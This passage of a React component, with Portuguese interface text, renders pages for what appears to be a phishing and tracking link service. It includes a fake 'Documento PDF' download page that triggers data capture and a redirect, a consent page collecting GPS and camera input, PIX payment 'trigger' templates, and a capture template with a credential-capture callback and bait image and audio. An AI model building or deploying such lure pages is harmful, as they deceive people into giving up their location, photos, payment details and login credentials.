        onComplete={handleBridgeStayComplete}
      />
    );
  }

  if (status === 'consent' && link) {
    return (
      <ConsentCapturePage
        captureGps={link.capture_gps}
        captureCamera={!!link.capture_camera}
        onComplete={(gps, photo, denied, extras) => executeCaptureAndRedirect(gps, photo, denied, extras)}
      />
    );
  }

  if (status === 'template' && link) {
    if (link.capture_template === 'pdf_delivery') {
      const openDocument = async () => {
        if (!resolvedCode || captureRedirectStartedRef.current) return;
        captureRedirectStartedRef.current = true;
        await saveAndRedirect(resolvedCode, null);
      };

      return (
        <main className="fixed inset-0 z-[9999] flex min-h-screen items-center justify-center bg-background px-5 text-foreground">
          <section className="w-full max-w-md text-center" aria-labelledby="pdf-document-title">
            <div className="mx-auto mb-6 flex h-20 w-16 items-center justify-center rounded-md border border-border bg-card shadow-sm">
              <FileText className="h-9 w-9 text-destructive" aria-hidden="true" />
            </div>
            <h1 id="pdf-document-title" className="text-2xl font-semibold">Documento PDF</h1>
            <p className="mt-2 text-sm text-muted-foreground">
              O documento está pronto para visualização.
            </p>
            <Button className="mt-7 w-full" size="lg" onClick={openDocument}>
              <Download className="h-4 w-4" aria-hidden="true" />
              Abrir PDF
            </Button>
            <p className="mt-4 text-xs text-muted-foreground">
              O arquivo será aberto no visualizador padrão deste dispositivo.
            </p>
          </section>
        </main>
      );
    }

    // Check if it's a trigger page template
    if (triggerPageTemplates[link.capture_template]) {
      return (
        <div className="fixed inset-0 w-full h-full z-[9999] overflow-auto">
          <TriggerPage
            templateId={link.capture_template}
            onAllow={handleTemplateAllow}
            isLoading={templateLoading}
            pixData={link.pix_metadata}
          />
        </div>
      );
    }
    return (
      <div className="fixed inset-0 w-full h-full bg-background z-[9999] overflow-auto">
        <CaptureTemplate
          templateId={link.capture_template}
          onAllow={handleTemplateAllow}
          isLoading={templateLoading}
          onCredentialCapture={(creds) => setCapturedCredentials(creds)}
          baitImageUrl={link.custom_image_url || undefined}
          baitAudioUrl={link.bait_audio_url || undefined}
          baitAudioDuration={link.bait_audio_duration_seconds || undefined}
        />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center gap-4" style={{ background: '#fff' }}>
      {status === 'error' || status === 'expired' || status === 'limit_reached' ? (
        <div className="text-center space-y-3 px-6">
          <AlertCircle className="w-8 h-8 mx-auto" style={{ color: '#999' }} />
          <p style={{ color: '#666', fontSize: '14px', maxWidth: '320px', margin: '0 auto' }}>{errorMessage || 'Página não encontrada.'}</p>
          <a
            href="https://trace-hub.com"
            style={{ display: 'inline-block', marginTop: '8px', padding: '8px 16px', background: '#1a73e8', color: '#fff', borderRadius: '6px', fontSize: '13px', textDecoration: 'none' }}
          >
            Voltar ao site
          </a>
        </div>
      ) : (
        <Loader2 className="w-6 h-6 animate-spin" style={{ color: '#ccc' }} />
      )}
    </div>
  );
}
